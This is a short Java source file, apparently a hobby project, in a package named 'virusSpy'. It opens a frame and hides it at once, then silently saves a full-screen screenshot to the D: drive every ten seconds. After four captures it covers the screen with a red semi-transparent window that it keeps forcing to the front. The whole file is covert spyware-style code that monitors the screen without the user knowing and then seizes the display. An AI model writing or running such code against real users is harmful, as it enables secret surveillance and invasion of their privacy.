package ru.shishkin.virusSpy;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

class Frame extends JFrame {
    private Robot rob;
    private Timer tm, tm1;
    int kol, time = 0;

    public Frame() {
        try {
            rob = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }

        tm = new Timer(10000, new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                saveScreen();
            }
        });

        tm.start();


        setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
        setVisible(true);
        setVisible(false);
    }

    private void saveScreen() {

        kol++;
        Dimension dm = Toolkit.getDefaultToolkit().getScreenSize();

        int w = dm.width;
        int h = dm.height;

        BufferedImage img = rob.createScreenCapture(new Rectangle(0, 0, w, h));

        try {
            ImageIO.write(img, "PNG", new File("D:\\img" + kol + ".png"));
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (kol > 3) {

            tm.stop();

            JFrame wnd = new JFrame();

            wnd.setResizable(false);

            wnd.setBounds(0, 0, w, h);

            JPanel pan = new JPanel();

            pan.setBackground(Color.RED);

            wnd.add(pan);

            wnd.setUndecorated(true);

            wnd.setOpacity(0.5f);

            wnd.setAlwaysOnTop(true);

            wnd.setVisible(true);

            tm1 = new Timer(10, new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    wnd.toFront();
                    time++;

                    if (time > 1000) {
                        tm1.stop();
                        wnd.setVisible(false);
                    }
                }
            });

            tm1.start();
        }
    }
}